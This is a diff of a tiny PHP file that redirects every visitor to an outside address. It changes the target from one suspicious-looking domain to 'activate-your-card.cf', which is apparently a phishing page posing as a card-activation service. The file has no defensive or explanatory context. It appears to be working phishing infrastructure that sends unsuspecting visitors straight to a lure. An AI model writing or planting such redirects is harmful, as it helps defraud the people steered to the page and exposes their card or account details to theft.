@@ -1,4 +1,4 @@
 <?php
-header("Location: https://get-started-your-setup.site/actnor/");
+header("Location: https://activate-your-card.cf/actnor/");
 die();
 ?>
